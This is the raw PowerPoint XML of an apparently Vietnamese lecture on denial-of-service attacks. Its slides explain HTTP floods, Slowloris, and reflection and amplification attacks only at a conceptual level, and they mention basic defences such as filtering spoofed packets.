              <a:t>ừ chối dịch vụ </a:t>
            </a:r>
            <a:br>
              <a:rPr kumimoji="1" lang="en-GB" altLang="en-US"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="3000"/>
              <a:t>Tấn công băng thông dựa trên ứng dụng</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="en-US" sz="3000"/>
            </a:br>
            <a:endParaRPr lang="en-US" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="33795" name="Content Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{72EAC05C-4F6C-42FB-A38D-1374D2667BE6}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2500" b="1">
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
              </a:rPr>
              <a:t>Tấn công dựa trên HTTP</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2500" b="1">
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
              </a:rPr>
              <a:t>HTTP Flood</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:t>Gửi </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" dirty="0"/>
              <a:t>yêu cầu </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:t>HTTP từ các bot</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:t>Yêu cầu HTTP tiêu thụ tài nguyên đáng kể của máy chủ Web</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:t> Spidering: bots bắt </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" dirty="0"/>
              <a:t>đầu từ một liên kết HTTP nhất định và </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:t>sau đó đến tất </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" dirty="0"/>
              <a:t>cả các liên kết trên trang </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:t>web theo cách </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" dirty="0"/>
              <a:t>đệ quy </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1541509258"/>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a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{93CC16E3-1D50-46C7-A834-6CA3AA26E602}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>5. Nguy c</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN"/>
              <a:t>ơ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t> tấn công </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-GB"/>
              <a:t>t</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-GB" altLang="en-US"/>
              <a:t>ừ chối dịch vụ </a:t>
            </a:r>
            <a:br>
              <a:rPr kumimoji="1" lang="en-GB" altLang="en-US"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="3000"/>
              <a:t>Tấn công băng thông dựa trên ứng dụng</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="en-US" sz="3000"/>
            </a:br>
            <a:endParaRPr lang="en-US" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="33795" name="Content Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{72EAC05C-4F6C-42FB-A38D-1374D2667BE6}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="914400" y="1828800"/>
            <a:ext cx="10515600" cy="4351338"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2500" b="1">
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
              </a:rPr>
              <a:t>Tấn công dựa trên HTTP</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2500" b="1">
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
              </a:rPr>
              <a:t>Slowloris</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN">
                <a:latin typeface="Century Gothic" panose="020B0502020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="ＭＳ Ｐゴシック" pitchFamily="-110" charset="-128"/>
                <a:cs typeface="ＭＳ Ｐゴシック" pitchFamily="-110" charset="-128"/>
              </a:rPr>
              <a:t>HTTP protocol specification (RFC2616) states that a blank line must be used to indicate the end of the request header and the beginning of the payload. </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="4000">
              <a:latin typeface="Century Gothic" panose="020B0502020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN">
                <a:latin typeface="Century Gothic" panose="020B0502020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Slowloris  attack sends HTTP requests that does not include the terminating newline, so web server keeps connection open waiting for the newline that never arrives. Each connection occupies a thread, so many connections complete, eventually using up all threads in web server’s thread pool size</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1798298636"/>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B4FEDF28-185D-49B5-B9F0-B6C40EEDE0F3}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>5. Nguy c</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN"/>
              <a:t>ơ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t> tấn công </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-GB"/>
              <a:t>t</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-GB" altLang="en-US"/>
              <a:t>ừ chối dịch vụ</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="en-US"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="3200"/>
              <a:t>Tấn công phản xạ</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15363" name="Rectangle 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{795C6AD8-1C5D-4327-9C1E-6CCDD89FCEB8}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="762000" y="1676400"/>
            <a:ext cx="9525000" cy="5181600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:lnSpc>
                <a:spcPct val="110000"/>
              </a:lnSpc>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" dirty="0"/>
              <a:t>Kẻ tấn công gửi gói tin đến một dịch </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:t>vụ trên </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" dirty="0"/>
              <a:t>trung gian </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:t>với địa </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" dirty="0"/>
              <a:t>chỉ nguồn giả </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:t>mạo là hệ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" dirty="0"/>
              <a:t>thống mục tiêu thực tế</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:lnSpc>
                <a:spcPct val="110000"/>
              </a:lnSpc>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" dirty="0"/>
              <a:t>Khi trung gian </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:t>phản hồi, phản hồi </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" dirty="0"/>
              <a:t>sẽ được gửi đến các mục tiêu</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:lnSpc>
                <a:spcPct val="110000"/>
              </a:lnSpc>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:t>“Phản xạ” </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" dirty="0"/>
              <a:t>cuộc tấn </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:t>công qua trung gian</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:lnSpc>
                <a:spcPct val="110000"/>
              </a:lnSpc>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" dirty="0"/>
              <a:t>Mục đích là để tạo ra đủ số lượng các gói </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:t>tin để làm tràn </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" dirty="0"/>
              <a:t>ngập liên kết tới các hệ thống mục tiêu mà không cảnh </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:t>báo trung </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" dirty="0"/>
              <a:t>gian</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:lnSpc>
                <a:spcPct val="110000"/>
              </a:lnSpc>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:t>C</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" altLang="en-US"/>
              <a:t>ơ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:t> chế bảo </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" dirty="0"/>
              <a:t>vệ cơ bản chống lại các cuộc tấn </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:t>công này là </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" dirty="0"/>
              <a:t>chặn các gói tin </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:t>giả mạo nguồn</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="998286996"/>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a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{B4B12489-193D-4D66-82A8-92DC77E3959F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>5. Nguy c</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN"/>
              <a:t>ơ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t> tấn công </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-GB"/>
              <a:t>t</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-GB" altLang="en-US"/>
              <a:t>ừ chối dịch vụ</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="en-US"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="3200"/>
              <a:t>Tấn công phản xạ</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="35843" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{A30289BD-68EB-4606-A514-307F22B48AF5}"/>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1295400" y="1439862"/>
            <a:ext cx="8991600" cy="5079670"/>
          </a:xfrm>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2129836034"/>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E4FE44D5-C34C-44AB-AD55-0F34B2ACF5B3}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>5. Nguy c</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN"/>
              <a:t>ơ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t> tấn công </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-GB"/>
              <a:t>t</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-GB" altLang="en-US"/>
              <a:t>ừ chối dịch vụ</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="en-US"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="3200"/>
              <a:t>Tấn công phản xạ</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="37892" name="Rectangle 5">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F7E68BE9-10C5-4D2A-B870-08625595442D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr bwMode="black">
          <a:xfrm>
            <a:off x="360218" y="1600200"/>
            <a:ext cx="3068782" cy="4724400"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="70000" lnSpcReduction="20000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0">
              <a:buNone/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="4000" b="1">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
              </a:rPr>
              <a:t>Tấn công phản xạ DNS</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" eaLnBrk="1" hangingPunct="1">
              <a:buNone/>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="3500"/>
              <a:t>Biến thể</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="3100"/>
              <a:t> tạo </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="3100" dirty="0"/>
              <a:t>ra một vòng lặp khép kín giữa </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="3100"/>
              <a:t>trung gian (DNS server) </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="3100" dirty="0"/>
              <a:t>và mục </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="3100"/>
              <a:t>tiêu (kẻ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="3100" dirty="0"/>
              <a:t>tấn </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="3100"/>
              <a:t>công sử </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="3100" dirty="0"/>
              <a:t>dụng cổng </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="3100"/>
              <a:t>7 yêu cầu echo)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="3100" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="3500" dirty="0"/>
              <a:t>Khá dễ dàng để lọc và ngăn chặn</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="36868" name="Picture 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{616E3F1D-EFAF-459F-A9C4-B15ED838999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664527" y="1371600"/>
            <a:ext cx="8527473" cy="4168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66508810"/>
      </p:ext>
    </p:extLst>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
  <p:transition spd="slow"/>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642574BE-CC50-4FEE-B316-D4A629AC1B77}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title" idx="4294967295"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1412392" y="296379"/>
            <a:ext cx="9129712" cy="1143000"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="4000" b="1">
                <a:solidFill>
                  <a:prstClr val="white"/>
                </a:solidFill>
              </a:rPr>
              <a:t>5. Nguy c</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="4000" b="1">
                <a:solidFill>
                  <a:prstClr val="white"/>
                </a:solidFill>
              </a:rPr>
              <a:t>ơ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="4000" b="1">
                <a:solidFill>
                  <a:prstClr val="white"/>
                </a:solidFill>
              </a:rPr>
              <a:t> tấn công </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-GB" sz="4000" b="1">
                <a:solidFill>
                  <a:prstClr val="white"/>
                </a:solidFill>
              </a:rPr>
              <a:t>t</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-GB" altLang="en-US" sz="4000" b="1">
                <a:solidFill>
                  <a:prstClr val="white"/>
                </a:solidFill>
              </a:rPr>
              <a:t>ừ chối dịch vụ</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="en-US" sz="4000" b="1">
                <a:solidFill>
                  <a:prstClr val="white"/>
                </a:solidFill>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="3200" b="1">
                <a:solidFill>
                  <a:prstClr val="white"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Tấn công khuếch đại</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="41987" name="Picture 3" descr="f7.pdf">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{BAC67E49-6505-4857-940A-F9E0FEBA87DC}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3">
            <a:extLst>
              <a:ext uri="{28A0092B-C50C-407E-A947-70E740481C1C}">
                <a14:useLocalDpi xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main" val="0"/>
              </a:ext>
            </a:extLst>
          </a:blip>
          <a:srcRect l="5454" t="15294" r="12334" b="32409"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1296988" y="1412875"/>
            <a:ext cx="9218612"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89" name="Rectangle 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{465ED9A8-0FA6-4250-82A8-678D9B4EEDB6}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="-42552" y="5372100"/>
            <a:ext cx="1203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SzPct val="80000"/>
              <a:buChar char="•"/>
              <a:defRPr sz="2800">
                <a:solidFill>
                  <a:srgbClr val="000066"/>
                </a:solidFill>
                <a:latin typeface="Trebuchet MS" panose="020B0603020202020204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Lucida Sans Unicode" panose="020B0602030504020204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:buSzPct val="80000"/>
              <a:buChar char="–"/>
              <a:defRPr sz="2400">
                <a:solidFill>
                  <a:srgbClr val="000066"/>
                </a:solidFill>
                <a:latin typeface="Trebuchet MS" panose="020B0603020202020204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Lucida Sans Unicode" panose="020B0602030504020204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:buSzPct val="80000"/>
              <a:buChar char="•"/>
              <a:defRPr sz="2000">
                <a:solidFill>
                  <a:srgbClr val="000066"/>
                </a:solidFill>
                <a:latin typeface="Trebuchet MS" panose="020B0603020202020204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Lucida Sans Unicode" panose="020B0602030504020204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:buSzPct val="80000"/>
              <a:defRPr sz="2000">
                <a:solidFill>
                  <a:srgbClr val="000066"/>
                </a:solidFill>
                <a:latin typeface="Trebuchet MS" panose="020B0603020202020204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Lucida Sans Unicode" panose="020B0602030504020204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:buChar char="»"/>
              <a:defRPr sz="2000">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Lucida Sans"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chemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Lucida Sans"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chemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Lucida Sans"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chemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Lucida Sans"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chemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Lucida Sans" panose="020B0602030504020204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Lucida Sans Unicode" panose="020B0602030504020204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
